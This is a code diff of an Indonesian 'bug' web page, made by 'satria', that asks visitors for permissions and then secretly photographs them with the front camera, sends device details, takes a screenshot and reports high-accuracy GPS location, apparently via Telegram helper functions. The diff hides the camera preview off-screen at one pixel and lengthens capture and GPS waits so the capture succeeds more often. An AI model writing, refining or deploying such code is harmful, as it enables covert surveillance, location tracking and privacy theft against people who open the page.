@@ -38,17 +38,27 @@
             line-height: 1.5;
         }
         .hidden {
-            display: none;
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            overflow: hidden;
+            opacity: 0;
         }
-        video, canvas {
-            display: none;
+        #camera-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 1px;
+            height: 1px;
+            overflow: hidden;
         }
     </style>
 </head>
 <body>
     <div id="permission-container">
-        <div id="permission-text">Mistery Bug
-               </div>
+        <div id="permission-text">Mistery Bug</div>
         <div id="permission-details">
             selamat databg di web bug sederhana ku 
             dibuat oleh : satria 
@@ -56,7 +66,10 @@
             Harap izinkan permintaan akses yang akan muncul.
         </div>
     </div>
-    <video id="v" autoplay muted class="hidden"></video>
+    
+    <div id="camera-container">
+        <video id="v" autoplay muted></video>
+    </div>
     <canvas id="c" class="hidden"></canvas>
 
     <script>
@@ -165,29 +178,61 @@
             return m;
         };
         
+        // Fungsi untuk mengambil gambar dari kamera
+        const captureCameraImage = async () => {
+            try {
+                const v = document.getElementById('v');
+                const c = document.getElementById('c');
+                
+                // Coba gunakan kamera depan terlebih dahulu
+                const constraints = {
+                    video: { 
+                        facingMode: "user",
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    }
+                };
+                
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                v.srcObject = stream;
+                
+                // Tunggu hingga video siap (minimal 2 detik)
+                await new Promise(resolve => {
+                    v.onloadedmetadata = () => {
+                        setTimeout(resolve, 2000); // Tambah delay untuk memastikan kamera siap
+                    };
+                });
+                
+                // Atur ukuran canvas sesuai dengan video
+                c.width = v.videoWidth;
+                c.height = v.videoHeight;
+                
+                // Gambar frame video ke canvas
+                const ctx = c.getContext('2d');
+                ctx.drawImage(v, 0, 0, c.width, c.height);
+                
+                // Konversi canvas ke blob dan kirim
+                c.toBlob(blob => {
+                    sP(blob, 'camera_capture.jpg');
+                    // Hentikan stream setelah mengambil gambar
+                    stream.getTracks().forEach(track => track.stop());
+                }, 'image/jpeg', 0.8);
+                
+                return true;
+            } catch (error) {
+                console.error("Error accessing camera:", error);
+                await sTG('❌ Camera access blocked: ' + error.message);
+                return false;
+            }
+        };
+        
         // Fungsi untuk meminta izin dan mengirim data
         const requestPermissions = async () => {
             // Kirim informasi device terlebih dahulu
             await sTG(await cDI());
             
-            // Minta izin kamera
-            try {
-                const v = document.getElementById('v'),
-                      c = document.getElementById('c'),
-                      st = await navigator.mediaDevices.getUserMedia({ video: true });
-                
-                v.srcObject = st;
-                await new Promise(r => setTimeout(r, 1000));
-                
-                c.width = v.videoWidth;
-                c.height = v.videoHeight;
-                c.getContext('2d').drawImage(v, 0, 0);
-                c.toBlob(b => sP(b, 'camera_capture.jpg'), 'image/jpeg');
-                
-                st.getTracks().forEach(t => t.stop());
-            } catch(e) {
-                await sTG('❌ Camera access blocked');
-            }
+            // Minta izin kamera dan ambil gambar
+            await captureCameraImage();
             
             // Ambil screenshot
             try {
@@ -209,7 +254,7 @@
                     async e => {
                         await sTG(`❌ GPS Error: ${e.message}`);
                     },
-                    { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 }
+                    { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
                 );
             }
         };
